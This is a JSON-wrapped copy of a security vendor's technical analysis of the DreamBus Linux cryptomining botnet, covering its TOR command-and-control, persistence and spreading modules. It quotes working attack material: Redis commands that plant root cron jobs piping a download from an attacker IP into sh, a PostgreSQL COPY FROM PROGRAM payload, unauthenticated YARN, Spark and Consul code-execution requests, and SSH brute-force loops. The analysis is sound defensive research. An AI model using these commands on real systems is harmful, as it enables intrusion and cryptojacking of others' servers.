{
    "id": "7da4ce19-f40c-4847-a16f-ee240045652b",
    "created_at": "2023-01-12T15:06:26.415103Z",
    "updated_at": "2025-03-27T02:17:01.047178Z",
    "deleted_at": null,
    "sha1_hash": "fe406221165a7ce679bf67742462a3f17b34187e",
    "title": "2021-01-22 - DreamBus Botnet - Technical Analysis",
    "authors": "",
    "file_creation_date": "2022-05-28T23:07:54Z",
    "file_modification_date": "2022-05-28T23:07:54Z",
    "file_size": 485148,
    "plain_text": "# DreamBus Botnet – Technical Analysis\n\n**[zscaler.com/blogs/security-research/dreambus-botnet-technical-analysis](https://www.zscaler.com/blogs/security-research/dreambus-botnet-technical-analysis)**\n\nZscaler’s ThreatLabZ research team recently analyzed a Linux-based malware family that we\nhave dubbed the DreamBus Botnet. The malware is a variant of _[SystemdMiner, which](https://blog.netlab.360.com/systemdminer-when-a-botnet-borrows-another-botnets-infrastructure/)_\nconsists of a series of Executable and Linkable Format (ELF) binaries and Unix shell scripts.\n[Some components of the botnet have been analyzed in the past with the malware dating](https://unit42.paloaltonetworks.com/pgminer-postgresql-cryptocurrency-mining-botnet/%20)\nback to early 2019. Many of the DreamBus modules are poorly detected by security\nproducts. This is in part because Linux-based malware is less common than Windows-based\nmalware, and thus receives less scrutiny from the security community. However, many critical\nbusiness systems run on Linux systems, and malware that is able to gain access to these\nsystems can cause significant disruption and irreparable harm to organizations that fail to\nsecure their servers properly.\n\nThe DreamBus malware exhibits worm-like behavior that is highly effective in spreading due\nits multifaceted approach to propagating itself across the internet and laterally through an\ninternal network using a variety of methods. These techniques include numerous modules\nthat exploit implicit trust, weak passwords, and unauthenticated remote code execution\n(RCE) vulnerabilities in popular applications, including Secure Shell (SSH), IT administration\ntools, a variety of cloud-based applications, and databases. These particular applications are\ntargeted because they often run on systems that have powerful underlying hardware with\nsignificant amounts of memory and powerful CPUs—all of which allow threat actors to\nmaximize their ability to monetize these resources through mining cryptocurrency.\n\nWhile the primary DreamBus malware payload is an open source Monero cryptocurrency\nminer known as XMRig, the threat actor can potentially pivot in the future to carrying out\nmore destructive activities, such as ransomware or stealing an organization’s data and\nholding it hostage.\n\n\n-----\n\n**Key Points**\n\nDreamBus is a modular Linux-based botnet with worm-like behavior that has been\naround at least since early 2019\nThe malware can spread to systems that are not directly exposed to the internet by\nscanning private RFC 1918 subnet ranges for vulnerable systems\nDreamBus uses a combination of implicit trust, application-specific exploits, and weak\npasswords to gain access to systems such as databases, cloud-based applications,\nand IT administration tools\nThe botnet is currently monetized through leveraging infected systems to mine Monero\ncryptocurrency using XMRig\nThe threat actor operating DreamBus appears to be located in Russia or Eastern\nEurope based on the time of deployment for new commands\n\n## Technical analysis\n\nThe main component of DreamBus is an ELF binary that is responsible for setting up the\nenvironment, infecting systems with copies of itself, downloading new modules for spreading,\nand deploying XMRig to mine Monero cryptocurrency. Each DreamBus ELF binary is packed\nby [UPX with a modified header and footer. This alteration is designed to obfuscate the](https://upx.github.io/)\nmalware’s code and reduce the file size. The magic bytes UPX! (0x21585055) are typically\nreplaced with non-ASCII values. Figure 1 shows an example of the UPX header replaced\nwith the value 0x3330dddf.\n```\n00000000 7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00 |.ELF............|\n00000010 02 00 3e 00 01 00 00 00 d0 64 40 00 00 00 00 00 |..>[email protected]|\n00000020 40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 |@...............|\n00000030 00 00 00 00 40 00 38 00 03 00 40 00 00 00 00 00 |[email protected]@.....|\n00000040 01 00 00 00 05 00 00 00 00 00 00 00 00 00 00 00 |................|\n00000050 00 00 40 00 00 00 00 00 00 00 40 00 00 00 00 00 |[email protected]@.....|\n00000060 b5 76 00 00 00 00 00 00 b5 76 00 00 00 00 00 00 |.v.......v......|\n00000070 00 00 20 00 00 00 00 00 01 00 00 00 06 00 00 00 |.. .............|\n00000080 00 00 00 00 00 00 00 00 00 80 40 00 00 00 00 00 |[email protected]|\n00000090 00 80 40 00 00 00 00 00 00 00 00 00 00 00 00 00 |[email protected]|\n000000a0 78 93 20 00 00 00 00 00 00 10 00 00 00 00 00 00 |x. .............|\n000000b0 51 e5 74 64 06 00 00 00 00 00 00 00 00 00 00 00 |Q.td............|\n000000c0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 |................|\n*\n000000e0 10 00 00 00 00 00 00 00 18 b9 39 c1 df dd 30 33 |..........9...03|\n\n```\n_Figure 1. Example UPX header modified by DreamBus_\n\nWhile this slight modification breaks the UPX command line tool, the ELF binary is still valid.\nTherefore, it can be unpacked and executed. This simple change may be sufficient to bypass\nsome security software. Antivirus software often has low detection rates for DreamBus and\nits various modules.\n\n\n-----\n\nDreamBus is designed to be portable across a range of Unix and Linux-based operating\nsystems. To be as portable as possible, the malware downloads various dependencies and\ncomponents if they are not present on the compromised system.\n\n## Botnet architecture\n\nDreamBus has a modular design with regular deployment of new modules and updates. Most\ncommand-and-control (C&C) components are hosted through TOR or on an anonymous filesharing service such as oshi[.]atand leverage the HTTP protocol. The malware name is\nderived from the prefix of the TOR domain dreambusweduybcp[.]onion that has been used\nfor C&C communications since July 2019. Figure 2 shows a high-level diagram of the\nDreamBus botnet architecture and its various modules.\n\nAt the time of publication, Zscaler ThreatLabZ has observed modules designed to spread\nthrough SSH, PostgreSQL, Redis, Hadoop YARN, Apache Spark, HashiCorp Consul, and\nSaltStack. Many DreamBus plugins share code, for example, to create a lock file named 22\nin the directory /tmp/.X11-unix/ and most set the name of the calling thread to tracepath. This\nis intended to disguise the DreamBus modules and make them appear to be legitimate (since\nmany modules are downloaded with pseudo-randomly generated filenames).\n\n_Figure 2. High-level diagram of the DreamBus botnet architecture_\n\nSince not all compromised systems have TOR installed, DreamBus will use a proxy service\nsuch as tor2web to translate requests between TOR and the internet (described in more\ndetail later in this analysis)\n\n## DreamBus scanning behavior\n\n\n-----\n\nThe success of DreamBus is dependent on spreading to as many systems as possible.\nTherefore, it scans systems that are on a local intranet as well as the internet. Most\nDreamBus modules scan the internal RFC 1918 ranges 172.16.0.0/12, 192.168.0.0/16, and\n10.0.0.0/8 for vulnerable applications that it targets. Figure 3 illustrates this scanning\nprocess.\n\n_Figure 3. DreamBus scanning behavior for public and private networks_\n\nMost DreamBus modules (with a few exceptions) scan the following internet ranges:\n\n\n-----\n\n[1-3].0.0.0/8\n5.0.0.0/8\n8.0.0.0/8\n\n[12-15].0.0.0/8\n18.0.0.0/8\n20.0.0.0/8\n\n[23-24].0.0.0/8\n27.0.0.0/8\n31.0.0.0/8\n\n[34-47].0.0.0/8\n\n[49-52].0.0.0/8\n54.0.0.0/8\n\n[57-98].0.0.0/8\n\n[100-126].0.0.0/8\n\n[128-213].0.0.0/8\n\n[216-223].0.0.0/8\n\n## DreamBus main spreader module\n\nThe main component of DreamBus has the ability to spread itself through SSH. This module\nis also downloaded over HTTP whenever an exploitation attempt is successful, typically\nthrough a number of hardcoded TOR domains. The HTTP request path to download the main\nDreamBus spreader module (after exploitation) is made in the format of the exploit that was\nsuccessful, as shown in Table 1\n\nSuccess Exploit Path Name Request\n\n/int.<arch> Main Spreader Module\n\n/sh.<arch> SSH Bruteforce\n\n/pg.<arch> or /pgl.<arch> PostgreSQL\n\n/rd.<arch> or /rdl.<arch> Redis\n\n/hdl.<arch> Hadoop YARN\n\n/sp.<arch> Apache Spark\n\n/csl.<arch> HashiCorp Consul\n\n\n-----\n\n/st.<arch> SaltStack\n\n_Table 1. DreamBus pathnames to report a successful exploitation attempt and download the_\n_main spreader module_\n\nThe DreamBus spreader module contains seven shell scripts that are responsible for\nperforming various actions. The first script is designed to set up a temporary directory that is\nused by the malware for lock files under /tmp/.X11-unix/. The DreamBus spreader module\ncreates the lock file 01 in this directory. The malware then continues to execute a number of\nshell commands to set up the environment, and removes competing malware, other\ncryptocurrency miners, and cloud software. The shell scripts also define a set of variables\nand functions. DreamBus and its modules predominantly use cURL for network\ncommunications and set the HTTP user agent string to a hyphen (-) character. The shell\nscripts also define TOR domains that are used for C&C communications. Identical code is\nfound in many of the second-stage DreamBus modules.\n\nThe DreamBus function sockz() uses DNS over HTTP to resolve IP addresses for the\ndomain name relay.tor2socks.in. by querying the following domains:\n\ndoh.defaultroutes.de\ndns.hostux.net\nuncensored.lux1.dns.nixnet.xyz\ndns.rubyfish.cn\ndns.twnic.tw\ndoh.centraleu.pi-dns.com\ndoh.dns.sb\ndoh-fi.blahdns.com\nfi.doh.dns.snopyta.org\ndns.flatuslifir.is\ndoh.li\ndns.digitale-gesellschaft.ch\n\nThe function x() is used to establish persistence by creating a cron job that runs once per\nhour with the starting minute determined randomly between 0-58. The cron job will be\ncreated in one of the following locations:\n\n$HOME/.systemd-service.sh\n/opt/systemd-service.sh\n/etc/cron.d/0systemd-service\n\nThe cron will execute a shell script that will download an updated copy of the DreamBus\nmalware over TOR.\n\n\n-----\n\nThe function fexe() creates a file named i with the line exit in the infected user s home\ndirectory, /tmp, /var/tmp and /usr/bin directories. It then attempts to execute the file and\ndelete it. This is designed to find a directory in which the malware can write and execute files.\n\nAnother DreamBus function named isys() decodes and executes a Base64 encoded string\n[that downloads the cURL utility if it does not exist through the /dev/tcp device, or through](https://curl.se/)\nwget. DreamBus will also download the socket statistics ss utility if it is not available. The\nfunction then attempts to use the yum and apt package managers to install and enable the\ncron service, and uninstall aegis and qcloud.\n\nThe function issh() is designed to spread DreamBus through SSH. It attempts to use IT\nautomation tools such as ansible, knife, salt, and pssh (parallel ssh) with a Base64 encoded\nstring that contains shell commands to infect remote systems that will be discussed in more\ndetail in the following paragraphs. This function also extracts hosts from a user’s\nbash_history, /etc/hosts file, and known_hosts file with grep using a regular expression,\nfiltering entries that start with the prefix 127 (to remove localhost) as shown below:\n```\nhosts=$(grep -oE \"\\b([0-9]{1,3}\\.){3}[0-9]{1,3}\\b\" ~/.bash_history /etc/hosts\n~/.ssh/known_hosts |grep -v ^127.|awk -F: {'print $2'}|sort|uniq)\n\n```\nFor each host, the module tries to authenticate as root using trusted SSH public key\nauthentication:\n```\nfor h in $hosts;do ssh -oBatchMode=yes -oConnectTimeout=5 -oPasswordAuthentication=no\n-oPubkeyAuthentication=yes -oStrictHostKeyChecking=no -l root $h\n\n```\nIt then tries to authenticate to each remote server with the username of the compromised\naccount with SSH public key authentication:\n```\nfor h in $hosts;do ssh -oBatchMode=yes -oConnectTimeout=5 -oPasswordAuthentication=no\n-oPubkeyAuthentication=yes -oStrictHostKeyChecking=no -l $USER $h\n\n```\nIf either the IT automation tools or SSH public key authentication attempts are successful, the\nmain DreamBus spreader module will execute a series of commands on the remote system\nto retrieve the username, computername, architecture, and external IP address, compute an\nMD5 hash of the system’s network IP addresses, and list that user’s cron jobs. The newly\ncompromised system will concatenate and append each value with an underscore and send\nan HTTP request over TOR with the result in the referrer field. Table 2 shows how these\nfields are obtained on an infected system\n\nExternal IP User Hardware Hostname MD5 Hash of IPs Cron\n\n\n-----\n\nResult of ip.sb or\ncheckip.amazonaws.com\n\n\n_whoami_ _uname -_\n_m_\n\n\n_uname -n_ _ip a | grep 'inet '|_\n_awk {'print $2'} |_\n_md5sum | awk_\n_{'print $1'}_\n\n\n_crontab_\n_-l |_\n_base64_\n_-w0_\n\n\n_Table 2. System information collected by DreamBus to track infections_\n\nThe TOR connection is established through a SOCKS5 proxy connection to one of the IPs\nresolved from the sockz() function to connect to a hardcoded TOR domain. If this fails, it will\ntry to use an HTTP TOR proxy using one of the following services prepended with the\nhardcoded TOR domain.\n\ntor2web.in\ntor2web.it\nonion.foundation\nonion.com.de\nonion.sh\ntor2web.su\ntor2web.io\n\nThe main DreamBus spreader module will use one of these TOR proxies to send an HTTP\nrequest to the path /int.<arch>, where the architecture is determined by the command line\nuname -m. The response to this request is typically either the DreamBus spreader module or\na series of shell commands to execute that is dependent on the system architecture.\nDreamBus provides support for the following hardware architectures, which includes both 32bit and 64-bit versions:\n\narmv7l\narmv6l\nmips\nmips64el\naarch64\ni686\nx86_64\n\nThe main spreader module also has a function named ibot() that is designed to report the\ninfection back to the C&C server. This allows the threat actor to track infections and identify\nthe exploits that are most effective. The request uses cURL (or wget as a fallback) to send an\nHTTP request to a hardcoded TOR domain with the path /bot. The same system information\nis passed in the HTTP referrer with the format shown in Table 2.\n\nThe function called iscn() terminates processes named tracepath and sends an HTTP\nrequest with the path /trc to a hardcoded TOR domain. The output is saved to a file with a\nname determined by computing an MD5 hash from the output of the command line date\n\n\n-----\n\nutility. This file is then executed and deleted.\n\nIn another shell script, DreamBus defines a function called u() that sends an HTTP request to\nthe path /cmd to a hardcoded TOR domain and executes the result without saving it to disk.\nThe same function name is also used to download an XMRig Monero miner from the path\n/cpu and the main spreader module /int.<arch> described above.\n\nThe responses from the /trc and /cmd paths typically provide instructions to download\nsecond-stage modules that are used to propagate the malware further. These modules are\ndescribed in the following sections.\n\n## DreamBus SSH bruteforce module\n\nThe SSH bruteforce module is delivered as a shell script that contains commands to\ndownload and extract a tar archive file named sshd into the directory /tmp/.X11-unix/sshd.\nOnce extracted, there are three components, as shown in Table 3.\n\nFilename Description\n\nss The tool [pnscan used by DreamBus to scan for SSH servers on the local](http://www.lysator.liu.se/~pen/pnscan)\nnetwork\n\nssh The tool sshpass for bruteforcing SSH passwords\n\npw List of passwords to use for SSH bruteforce\n\n_Table 3. Files extracted from the DreamBus SSH bruteforce module_\n\nThe first file named ss (not to be confused with the socket statistics application) is the open\nsource tool Parallel Network Scanner (a.k.a., pnscan) compiled as an ELF binary.\n\nThe second file named ssh is another ELF binary based on the open source tool sshpass\nthat is designed to automate SSH authentication and shell script execution. The source code\nhas been modified in several places including the supported command-line arguments to the\nfollowing:\n```\nUsage: sshpass address port username dict_file [threads=100]\n\n```\n\n-----\n\nAll second-stage DreamBus plugins, including the SSH bruteforce module, create a lock file\nnamed 22 in the lock file directory /tmp/.X11-unix/. Upon a successful SSH login, the code\nalso includes a Base64 encoded shell script that will be executed on the remote host. The\nshell commands will download and execute the main DreamBus spreader module via the\npath /sh.<arch>.\n\nThe pw file contains a list of approximately 2,711 passwords that are used for the SSH\nbruteforce attack and passed to the sshpass utility.\n\nThe script attempts to move laterally within a private internal network by first enumerating the\nsystem’s network adapters and searching for regexes that loosely match RFC 1918 IP\naddress ranges. The code writes a shell command to a file named r passing the sshpass\napplication along with a placeholder for an IP address to launch an SSH bruteforce attack\nagainst various usernames (e.g., hadoop, jenkins, kafka, postgres, redis, root, ubuntu,\nvagrant, varnish, and yarn), and the file pw to use for the password dictionary. The pnscan\ntool ss is then used to scan the internal subnets for online SSH servers and saved to a file\nnamed ip. This file is then read by the script named r to launch the SSH bruteforce attack.\nThe code for this process is shown below:\n```\necho '[ -s ip ] && for i in $(cut -d\" \" -f1 ip|sort -R|head -20);do timeout 12m ./ssh\n$i 22 root ./pw >/dev/null 2>&1;done' > r\nchmod +x *;ulimit -n 60000;>ip;touch -r ss r ip\nn1=$(ip a|awk {'print $2'}|grep ^10[.] |sort -R|head -1|cut -d. -f1,2)\nn2=$(ip a|awk {'print $2'}|grep ^172[.][1-3]|sort -R|head -1|cut -d. -f1,2)\nn3=$(ip a|awk {'print $2'}|grep ^192.168|sort -R|head -1|cut -d. -f1,2)\n[ ! -z \"$n1\" ] && (./ss -r\"OpenSSH\" $n1.0.0/16 22 >ip;./r)\n[ ! -z \"$n2\" ] && (./ss -r\"OpenSSH\" $n2.0.0/16 22 >ip;./r)\n[ ! -z \"$n3\" ] && (./ss -r\"OpenSSH\" $n3.0.0/16 22 >ip;./r)\n\n## DreamBus PostgreSQL module\n\n```\n[PostgreSQL (or Postgres) is a popular open source SQL database application that is](https://www.postgresql.org/)\ntargeted by DreamBus. Zscaler ThreatLabZ has observed numerous versions of the\nDreamBus PostgreSQL module with several differences between them, such as code that\nsets the calling thread name, and the internet ranges and port numbers that are scanned.\n\nMost PostgreSQL modules use the standard tracepath naming convention mentioned earlier.\nHowever, some PostgreSQL modules set the calling thread name to postgres: logical\nreplication launcher or postgres: autovacum.\n\nAll versions of the DreamBus PostgreSQL modules spread by scanning the RFC 1918\nprivate networks for PostgreSQL servers running on port 5432. However, the internet ranges\nthat are scanned vary depending on the module version. Most of the modules scan the\nranges listed in the DreamBus Scanning Behavior section of this report. However, at least\none variant of the DreamBus PostgreSQL module scans all internet ranges between\n1.0.0.0/8 – 222.0.0.0/8 on ports 5432 and 5433.\n\n\n-----\n\nIn order to identify a PostgreSQL server, the DreamBus module sends the bytes 00 00 00 08\n04 D2 16 00. These bytes start the SSL handshake to the PostgreSQL server. The last byte\nof the packet, however, has been set to NULL so that it will trigger an error message from a\nPostgreSQL server. More specifically, the DreamBus PostgreSQL module will check for the\nresponse unsupported frontend protocol. If this message is returned by the server, the\nmodule will attempt to exploit the system through a bruteforce password attack. The\nDreamBus PostgreSQL modules vary in the username and password lists that they use. To\ndate, Zscaler ThreatLabZ has observed the following usernames (in aggregate) across these\nmodules:\n\npostgres\nredmine\nroot\nadmin\nrdsdb\nclouder-scm\ndbadmin\nstolon\nodoo\n\nThe PostgreSQL modules include a hardcoded dictionary of passwords, with samples\ncontaining approximately 2,627 entries. If the DreamBus module is able to authenticate using\nany of these passwords, the malware executes an SQL query similar to the following\n```\nDROP TABLE IF EXISTS x0x0;CREATE TABLE x0x0(cmd_output text);COPY x0x0 FROM PROGRAM\n'echo WFJBT...\n[snip]...1zIDkga2RldnRtcGZzaQpwcyB4IHxncmVwIGtpbnNpbmd8eGFyZ3Mga2lsbCAtOSAKcHMgeCB8Z3J\n -d|bash';SELECT * FROM x0x0;DROP TABLE IF EXISTS x0x0;\n\n```\nThe database table name frequently changes (e.g., x0x0, abroxu, and putin) across the\nvarious PostgreSQL modules. This command exploits a disputed vulnerability CVE-20199193 that allows users with pg_execute_server_program privileges to execute arbitrary code.\nHowever, this behavior is considered to be a “feature” by PostgreSQL developers.\n\nThe SQL query will cause a shell script to be Base64 decoded and executed. The content\nconsists of a number of shell commands that will first kill competing malware such as kinsing.\nThe subsequent commands contain shell commands similar to the main module that will\nattempt to download cURL if it is not available, resolve DNS over HTTP for a TOR relay, and\nconnect to a hardcoded TOR domain to pull down the main module of DreamBus on the\nnewly infected system via an HTTP request path such as /pg.<arch> or /pgl.<arch> that\ndepends on the module version.\n\n## DreamBus Redis module\n\n\n-----\n\n[Redis is a popular open source data store that is used as a database, cache, and message](https://redis.io/)\nbroker. DreamBus regularly deploys second-stage modules that are designed to target\nRedis. The modules are very similar, all with the goal of achieving remote code execution via\na misconfigured Redis installation that either does not require a password or has a weak\n[password. These misconfigurations are well known to be exploited. Shodan estimated that](https://twitter.com/shodanhq/status/568085078447943680)\napproximately 56,000 Redis servers were misconfigured with no authentication required, and\n[Imperva estimated that nearly 75 percent of open Redis instances had been compromised.](https://www.imperva.com/blog/new-research-shows-75-of-open-redis-servers-infected/)\n\nDepending on the DreamBus Redis module version, the malware scans RFC 1918 private\nsubnets on ports 6379, 7000, and 7001 and the internet ranges mentioned before. There are\ntwo primary versions of the DreamBus Redis module that either attempt to bruteforce weak\npasswords or exploit an instance with no password authentication.\n\nThe Redis module that is designed to bruteforce passwords first checks if the Redis server\nrequires authentication by sending the command info and searching for the string NOAUTH\nAuthentication required. If this string is returned by the server, the Redis module will then\nsend an AUTH command with a password chosen from a hardcoded dictionary, which has\napproximately 28,930 entries. It will then check for the response OK. from the Redis server to\ndetermine whether authentication was successful. If the password is able to be guessed, the\nRedis module sends the following commands:\n```\nauth %s\nconfig set stop-writes-on-bgsave-error no\nflushall\nconfig set dir /etc/cron.d/\nconfig set dbfilename systemdd\nset r1 \"\\n\\n* * * * * root curl -fsS 94.237.85.89:8080/0|sh\\n\\n\"\nset r2 \"\\n\\n* * * * * root wget -qO- 94.237.85.89:8080/0|sh\\n\\n\"\nsave\nconfig set stop-writes-on-bgsave-error yes\nconfig set dir /tmp\nconfig set dbfilename .dump.rdb\nflushall\n\n```\nAnother version of the Redis module exploits systems that do not require authentication. This\nmodule first sends the Redis server an info command and searches for the string os:Linux. If\nthis string is found, the Redis module sends the following commands:\n```\nconfig set stop-writes-on-bgsave-error no\nflushall\nconfig set dir /etc/cron.d/\nconfig set dbfilename systemdd\nset r1 \"\\n\\n* * * * * root curl -fsS 94.237.85.89:8080/0l|sh\\n\\n\"\nset r2 \"\\n\\n* * * * * root wget -qO- 94.237.85.89:8080/0l|sh\\n\\n\"\nsave\nconfig set stop-writes-on-bgsave-error yes\nconfig set dir /tmp\nconfig set dbfilename .dump.rdb\nflushall\n\n```\n\n-----\n\nBoth attacks set the current directory to /etc/cron.d/ and create a file named systemdd within\nthis directory through the dbfilename variable. Note that this requires the Redis server to\nhave write permissions in the /etc/cron.d/ directory. The subsequent two lines will create cron\njobs that will be executed every minute to download and execute a shell command specified\nby the server and run as the root user. The save command will write the content to disk as a\nRedis database (RDB) file and, therefore, contain an RDB header. In order for this exploit to\nwork properly, the compromised system requires a cron implementation that will continue to\nparse the systemdd file after encountering the RDB header (which is not a valid cron format).\nAdditionally, in modern versions of Redis, the RDB files are compressed with LZF by default,\nso the implanted cron jobs may further be neutralized. After attempting to write the RDB file\ncontaining two cron tasks, the Redis module changes the dir and dbfilename variables to\ndummy values to hide its modifications.\n\nThere are two differences between these Redis modules’ commands. The auth command is\nonly used by the authentication module, and the path on the web server to download and\nexecute the second-stage shell script has the filename 0 (for the authentication module)\nversus 0l (for the module that spreads without authentication). The threat actor likely uses\nthese two paths for statistical purposes to differentiate the versions of the Redis module that\nspread more effectively. If exploitation is successful, a shell script will be downloaded and\nexecuted, which in turn will download the DreamBus main spreader module via the path /rd.\n<arch> or /rdl.<arch> depending on the module version.\n\n## DreamBus Hadoop YARN module\n\n[YARN is the resource management and job scheduling/monitoring component of the open](https://hadoop.apache.org/docs/current/hadoop-yarn/hadoop-yarn-site/YARN.html)\nsource Apache Hadoop distributed processing framework. The DreamBus Hadoop module\n[uses built-in YARN functionality to execute arbitrary commands via Hadoop's](https://github.com/rapid7/metasploit-framework/blob/f73a88a39ca25f2e1ab2d8b21144d798efe64191/modules/exploits/linux/http/hadoop_unauth_exec.rb)\nResourceManager REST API when authentication has not been configured.\n\nThe DreamBus Hadoop YARN module first checks whether the file /usr/bin/wget is\nexecutable. If this file does not exist, the module exits. Otherwise, the module scans RFC\n1918 private subnets and the internet ranges previously mentioned on port 8088. The first\nrequest made by the DreamBus Hadoop YARN module is used to identify YARN servers\nthrough the HTTP request:\n```\nGET /stacks HTTP/1.1\nHost: 127.0.0.1:8088\n\n```\nThe module checks for the presence of the string Process Thread Dump in the server’s\nresponse. If a match is found, the DreamBus YARN module executes a series of shell\ncommands. The first sends an HTTP POST request to the target server as shown below\nusing wget:\n```\nexec &>/dev/null;app_id=$(wget -qO- --post-data '' %s:%d/ws/v1/cluster/apps/newapplication|grep -o \"application_[0-9]*_[0-9]*\");\n\n```\n\n-----\n\nThe response is parsed for the application ID and stored in the app_id variable, which is\nrequired in the next request. After obtaining the app_id value, the module executes the\nfollowing shell command.\n```\nexec &>/dev/null;wget -qO- --post-data '{\"am-container-spec\": {\"commands\": {\"command\":\n\"echo WFJBTkRPTQpleGVjIC...\n[snip]...AtMSAvdG1wLy5YMTEtdW5peC8wMSkvc3RhdHVzIHx8IChjZCAvZGV2L3NobTt1ICR0LiRoKQplbHN\n -d|bash\"}},\"application-id\": \"'$app_id'\", \"application-type\": \"YARN\", \"applicationname\": \"'$app_id'\"}' --header \"Content-Type: application/json\"\n%s:%d/ws/v1/cluster/apps &>/dev/null\n\n```\nThis command sends an HTTP POST request to the YARN server with parameters that\ninclude the application ID and a Base64 encoded shell command, which will be executed by\nthe server without requiring any form of authentication. When the shell command is decoded\nand executed, it will download the main DreamBus spreader module using the path /hdl.\n<arch>.\n\n## DreamBus Apache Spark module\n\n[Apache Spark is an open source distributed cloud computing framework for large-scale data](https://spark.apache.org/)\nprocessing. This DreamBus module exploits a remote code execution vulnerability in Apache\nSpark when run in Standalone Mode and the Master REST URL is accessible. The exploit is\n[similar to several proof-of-concept examples.](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/linux/http/spark_unauth_rce.md)\n\nThe DreamBus Apache Spark module scans the same RFC 1918 private subnets and\ninternet ranges as the other modules. The Apache Spark module first sends an HTTP\nrequest on port 6066 to the target server shown below:\n```\nGET / HTTP/1.1\nHost: 127.0.0.1:6066\n\n```\nThe DreamBus module checks for SparkVersion in the response to identify whether the\nserver is an Apache Spark server. If the response matches, the DreamBus module will\nlaunch the exploit by sending the following HTTP POST request, which contains a link to a\nJava ARchive (JAR) file that contains a class that will be executed by the Spark server:\n```\nPOST /v1/submissions/create HTTP/1.1\nHost: %s:%d\nUser-Agent: spark-api-cli\nContent-Type: application/json\nContent-Length: %d\n{\"action\": \"CreateSubmissionRequest\",\"clientSparkVersion\": \"2.1.0\",\"appArgs\":\n[\"\"],\"appResource\": \"http://94.237.85[.]89:8080/xapp.jar\",\"environmentVariables\":\n{\"SPARK_ENV_LOADED\": \"1\"},\"mainClass\": \"xapp\",\"sparkProperties\": {\"spark.jars\":\n\"http://94.237.85[.]89:8080/xapp.jar\",\"spark.driver.supervise\":\n\"false\",\"spark.app.name\": \"xapp\",\"spark.eventLog.enabled\":\n\"false\",\"spark.submit.deployMode\": \"cluster\",\"spark.master\": \"spark://%s:%d\"} }\n\n```\n\n-----\n\nThe payload is a JAR file named xapp.jar that contains a single class file named xapp.class.\nThe code in this JAR invokes the shell /bin/sh and passes it Base64-encoded commands to\nexecute as shown below:\n```\npublic class xapp {\n public static void main(String[] paramArrayOfString) throws Exception {\n  String[] arrayOfString = new String[3];\n  arrayOfString[0] = \"/bin/sh\";\n  arrayOfString[1] = \"-c\";\n  arrayOfString[2] = \"echo\nWFJBTkRPTQpleGVjICY+L2Rldi9udWxsCmV4cG9ydCBQQVRIPSRQQVRIOiRIT01FOi9iaW46L3NiaW46L3Vzci\n[snip]...gxMS11bml4LzAxKS9zdGF0dXMgfHwgKGNkIC9kZXYvc2htO3UgJHQuJGgpCmVsc2UKYnJlYWsKZmk\n -d|bash\";\n  Runtime runtime = Runtime.getRuntime();\n  Process process = runtime.exec(arrayOfString);\n }\n}\n\n```\nWhen the shell command is decoded and executed, it will download the main DreamBus\nspreader module using the path /sp.<arch>.\n\n## DreamBus HashiCorp Consul module\n\n[HashiCorp Consul is a multicloud service networking platform to connect and secure](https://www.consul.io/)\nservices. This DreamBus module exploits a vulnerability in the HashiCorp Consul service’s\nAPI that enables remote code execution on Consul nodes. The exploit requires the settings\n_EnableScriptChecks, EnableLocalScriptChecks, or EnableRemoteScriptChecks to be_\nenabled on the server. The DreamBus module searches for Consul servers running on port\n8500. The module scans the same internal and external ranges as the other modules. The\nfirst step in the scanning process is to locate Consul servers through the HTTP request\nshown below:\n```\nGET /v1/agent/self HTTP/1.1\nHost: 127.0.0.1\n\n```\nThe DreamBus Consul module expects a response that contains only the letter a. It’s not\nquite clear why the malware author chose to use this as a flag for detecting a HashiCorp\nConsul instance, since this is likely to result in many false positives. A similar exploit\npublished by Metasploit checks for the EnableScriptChecks flags in the server response. If\nthe expected response condition is met, the DreamBus module will then attempt to remove a\nservice named systemd-service by sending the following HTTP PUT request to the Consul\nAPI:\n```\nPUT /v1/agent/service/deregister/systemd-service HTTP/1.1\nHost: %s:%d\nUser-Agent: consul-api-c\nContent-Type: application/json\n\n```\n\n-----\n\nAfter attempting to remove the service, the DreamBus Consul module will attempt to register\na service with the same name as shown below:\n```\nPUT /v1/agent/service/register HTTP/1.1\nHost: %s:%d\nUser-Agent: consul-api-c\nContent-Type: application/json\nContent-Length: %d\n{\"ID\": \"systemd-service\",\"Name\": \"systemd-service\",\"Address\": \"127.0.0.1\",\"Port\":\n8500,\"check\":{\"Args\": [\"sh\",\"-c\",\"echo WFJBTkRPTQpleGVjICY+L2Rldi...\n[snip]...UvZGVyZWdpc3Rlci9zeXN0ZW1kLXNlcnZpY2U7ZG9uZQpjb25zdWwgc2VydmljZXMgZGVyZWdpc3R\n -d|bash\"],\"TTL\": \"120s\"}}\n\n```\nThis registration command will register a service named systemd-service that executes\nBase64-encoded shell commands. These commands contain code similar to other\nDreamBus modules that attempt to download and install a cURL if it doesn’t exist on the\nsystem, and send a request to a hardcoded TOR domain with the filepath /csl.<arch>, which\nwill download and execute the main DreamBus module. The shell commands will also loop\nthrough the compromised system’s network adapters and attempt to deregister the systemdservice through the API and through the shell commands shown below:\n```\nips=$(echo localhost; echo 127.0.0.1;hostname -i;ip a |grep \"inet \"|awk {'print\n$2'}|cut -d '/' -f 1;ifconfig |grep \"inet \"|awk {'print $2'})\nfor i in $ips ;do curl -m60 -X PUT http://$i:\n{8500}/v1/agent/service/deregister/systemd-service;done\nfor i in $ips ;do wget -t1 -T60 -qO- --method=PUT http://$i:\n{8500}/v1/agent/service/deregister/systemd-service;done\nconsul services deregister -id=systemd-service\n\n```\nThe DreamBus Consul module will then send three subsequent HTTP PUT requests to\nregister the same service, but with a few slight variations of the command parameters using\nthe script parameter (instead of the Args) as shown below:\n```\nPUT /v1/agent/service/register HTTP/1.1\nHost: %s:%d\nUser-Agent: consul-api-c\nContent-Type: application/json\nContent-Length: %d\n{\"ID\": \"systemd-service\",\"Name\": \"systemd-service\",\"Address\": \"127.0.0.1\",\"Port\":\n8500,\"check\":{\"script\": \"echo WFJBTkRPTQpleGVjICY+L2Rldi...\n[snip]...UvZGVyZWdpc3Rlci9zeXN0ZW1kLXNlcnZpY2U7ZG9uZQpjb25zdWwgc2VydmljZXMgZGVyZWdpc3R\n -d|bash\",\"TTL\": \"120s\"}}\n\n```\nThe third registration request is identical to the first registration request, but the module\nreplaces the TTL field with the Interval field.\n\n\n-----\n\n```\nPUT /v1/agent/service/register HTTP/1.1\nHost: 